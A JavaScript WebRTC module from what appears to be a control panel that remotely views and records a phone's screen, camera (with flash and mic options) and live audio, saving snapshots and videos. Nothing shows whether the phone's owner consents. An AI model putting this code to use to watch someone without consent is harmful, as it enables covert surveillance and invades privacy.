// ==================== WEBRTC MODULE ====================
function createPeerConnection(streamType, onTrackCallback, useMic = false) {
    const pc = new RTCPeerConnection({ iceServers: CONFIG.ICE_SERVERS });

    if (streamType === 'screen') {
        pc.addTransceiver('video', { direction: 'recvonly' });
    } else if (streamType === 'camera') {
        pc.addTransceiver('video', { direction: 'recvonly' });
        if (useMic) {
            pc.addTransceiver('audio', { direction: 'recvonly' });
        }
    } else if (streamType === 'audio') {
        pc.addTransceiver('audio', { direction: 'recvonly' });
    }

    pc.ontrack = onTrackCallback;
    pc.onicecandidate = (e) => {
        if (e.candidate) {
            sendSignalingMessage({
                type: 'ICE_CANDIDATE',
                candidate: e.candidate,
                streamType: streamType
            });
        }
    };
    pc.oniceconnectionstatechange = () => {
        console.log(`${streamType} ICE state:`, pc.iceConnectionState);
        if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
            if (streamType === 'screen') {
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                closeScreenModal();
            }
        }
    };
    pc.onconnectionstatechange = () => {
        console.log(`${streamType} connection state:`, pc.connectionState);
    };
    return pc;
}

function getPCForType(type) {
    if (type === 'screen') return screenPC;
    if (type === 'camera') return cameraPC;
    if (type === 'audio') return audioPC;
    return null;
}

function handleSignalingMessage(msg) {
    console.log('Received signaling:', msg);
    if (msg.type === 'ANSWER') {
        const pc = getPCForType(msg.streamType);
        if (pc) {
            const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
            pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
        }
    } else if (msg.type === 'ICE_CANDIDATE') {
        const pc = getPCForType(msg.streamType);
        if (pc && msg.candidate) {
            pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
        }
    }
}

function openScreenModal() {
    modalOverlay.classList.add('show');
    document.body.classList.add('modal-open');
    modalRecordBtn.innerText = '🔴';
    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
        screenMediaRecorder.stop();
    }
    screenMediaRecorder = null;
    screenRecordedChunks = [];
}

function closeScreenModal() {
    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
        screenMediaRecorder.stop();
    }
    modalOverlay.classList.remove('show');
    document.body.classList.remove('modal-open');
    if (screenActive) {
        toggleScreen();
    }
    modalRecordBtn.innerText = '🔴';
}

async function toggleScreen() {
    console.log('toggleScreen called, current screenActive:', screenActive);
    if (screenActive) {
        if (screenPC) {
            screenPC.close();
            screenPC = null;
        }
        document.getElementById('screenBtn').innerText = 'Start Screen';
        screenActive = false;
        closeScreenModal();
        sendSignalingMessage({ type: 'STOP_SCREEN' });
    } else {
        openScreenModal();
        modalVideo.srcObject = null;

        screenPC = createPeerConnection('screen', (e) => {
            modalVideo.srcObject = e.streams[0];
            console.log('ontrack for screen', e.streams);
        }, false);

        try {
            const offer = await screenPC.createOffer();
            await screenPC.setLocalDescription(offer);
            sendSignalingMessage({
                type: 'OFFER',
                sdp: offer.sdp,
                streamType: 'screen'
            });
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            screenActive = true;
        } catch (e) {
            console.error('Screen share failed:', e);
            showNotification('Failed: ' + e.message);
            screenPC = null;
            closeScreenModal();
        }
    }
}

function snapScreenFromModal() {
    if (!modalVideo || !modalVideo.videoWidth) {
        alert('No active screen share or video not ready');
        return;
    }
    const canvas = document.createElement('canvas');
    canvas.width = modalVideo.videoWidth;
    canvas.height = modalVideo.videoHeight;
    canvas.getContext('2d').drawImage(modalVideo, 0, 0);
    canvas.toBlob(blob => {
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.download = `screenImage-${getFormattedDateTime()}.png`;
        a.href = url;
        a.click();
        URL.revokeObjectURL(url);
    }, 'image/png');
}

function toggleScreenRecording() {
    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
        screenMediaRecorder.stop();
        modalRecordBtn.innerText = '🔴';
    } else {
        if (!modalVideo.srcObject) {
            alert('Phone Screen Off');
            return;
        }
        screenRecordedChunks = [];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const stream = modalVideo.srcObject;

        if (modalVideo.videoWidth === 0) {
            modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
        } else {
            startScreenRecording(canvas, ctx, stream);
        }
    }
}

function startScreenRecording(canvas, ctx, originalStream) {
    canvas.width = modalVideo.videoWidth;
    canvas.height = modalVideo.videoHeight;

    function drawVideoFrame() {
        ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
        requestAnimationFrame(drawVideoFrame);
    }
    drawVideoFrame();

    const canvasStream = canvas.captureStream(30);
    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
    screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
    screenMediaRecorder.onstop = () => {
        const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `screenVideo-${getFormattedDateTime()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
        canvasStream.getTracks().forEach(track => track.stop());
    };
    screenMediaRecorder.start();
    modalRecordBtn.innerText = '🟢';
}

function toggleFullscreen() {
    if (!document.fullscreenElement) {
        modalVideo.requestFullscreen().catch(err => console.error('Fullscreen error:', err));
    } else {
        document.exitFullscreen();
    }
}

// Attach modal button listeners
document.getElementById('modalSnapBtn').addEventListener('click', snapScreenFromModal);
document.getElementById('modalRecordBtn').addEventListener('click', toggleScreenRecording);
document.getElementById('modalFullscreenBtn').addEventListener('click', toggleFullscreen);
document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);

async function startLiveStream() {
    const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
    const useFlash = document.getElementById('liveFlashCheckbox').checked;
    const useMic = document.getElementById('liveMicCheckbox').checked;

    panel.innerHTML = `
        <div style="position:relative;">
            <video id="liveCamVideo" autoplay playsinline style="width:100%; max-height:500px; background:#000;"></video>
            <div class="live-controls" style="margin-top:10px;">
                <button onclick="takeSnapshot()" id="snapshotBtn" style="background:#1976ff;">📸 Snapshot</button>
                <button onclick="toggleRecording()" id="recordBtn" style="background:#ff9800;">🔴 Record</button>
                <button class="stop" onclick="stopLiveStream()" style="background:#d32f2f;">⏹ Stop</button>
            </div>
        </div>
    `;

    cameraPC = createPeerConnection('camera', (e) => {
        const video = document.getElementById('liveCamVideo');
        if (video) video.srcObject = e.streams[0];
        console.log('ontrack for camera', e.streams);
    }, useMic);

    try {
        const offer = await cameraPC.createOffer();
        await cameraPC.setLocalDescription(offer);
        sendSignalingMessage({
            type: 'OFFER',
            sdp: offer.sdp,
            streamType: 'camera',
            camera: camera,
            flash: useFlash,
            mic: useMic
        });
    } catch (e) {
        console.error('Live camera start failed:', e);
        showNotification('Failed to start camera stream');
        cameraPC = null;
        panel.innerHTML = 'Ready.';
    }
}

function stopLiveStream() {
    if (cameraPC) {
        cameraPC.close();
        cameraPC = null;
    }
    sendSignalingMessage({ type: 'STOP_CAMERA' });
    panel.innerHTML = 'Ready.';
}

async function toggleLiveAudio() {
    if (audioPC) {
        stopLiveAudio();
    } else {
        startLiveAudio();
    }
}

async function startLiveAudio() {
    panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
    audioPC = createPeerConnection('audio', (e) => {
        const audioEl = document.getElementById('liveAudio');
        if (audioEl) {
            audioEl.srcObject = e.streams[0];
            audioEl.play().catch(err => console.log('Autoplay prevented:', err));
        }
        console.log('ontrack for audio', e.streams);
    }, true);

    try {
        const offer = await audioPC.createOffer();
        await audioPC.setLocalDescription(offer);
        sendSignalingMessage({
            type: 'OFFER',
            sdp: offer.sdp,
            streamType: 'audio',
            mic: true
        });
        document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
        document.getElementById('stopLiveAudioBtn').style.display = 'block';
    } catch (e) {
        console.error('Live audio start failed:', e);
        showNotification('Failed to start audio stream');
        audioPC = null;
        panel.innerHTML = 'Ready.';
    }
}

function stopLiveAudio() {
    if (audioPC) {
        audioPC.close();
        audioPC = null;
    }
    sendSignalingMessage({ type: 'STOP_AUDIO' });
    document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
    document.getElementById('stopLiveAudioBtn').style.display = 'none';
    panel.innerHTML = 'Ready.';
}

function takeSnapshot() {
    const video = document.getElementById('liveCamVideo');
    if (!video || !video.videoWidth) {
        alert('No live video or video not ready');
        return;
    }
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    canvas.toBlob(blob => {
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `snapshot_${Date.now()}.png`;
        a.click();
        URL.revokeObjectURL(url);
    }, 'image/png');
}

function toggleRecording() {
    const video = document.getElementById('liveCamVideo');
    if (!video || !video.srcObject) {
        alert('No live stream');
        return;
    }
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        document.getElementById('recordBtn').innerText = 'Record Video';
    } else {
        recordedChunks = [];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const stream = video.srcObject;

        if (video.videoWidth === 0) {
            video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
        } else {
            startCanvasRecording(video, canvas, ctx, stream);
        }
    }
}

function startCanvasRecording(video, canvas, ctx, originalStream) {
    canvas.width = video.videoHeight;
    canvas.height = video.videoWidth;

    function drawVideoFrame() {
        ctx.save();
        ctx.translate(canvas.width / 2, canvas.height / 2);
        ctx.rotate(90 * Math.PI / 180);
        ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
                     video.videoWidth, video.videoHeight);
        ctx.restore();
        requestAnimationFrame(drawVideoFrame);
    }
    drawVideoFrame();

    const canvasStream = canvas.captureStream(30);
    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
    mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `recording_${Date.now()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
        canvasStream.getTracks().forEach(track => track.stop());
    };
    mediaRecorder.start();
    document.getElementById('recordBtn').innerText = 'Stop Recording';
}
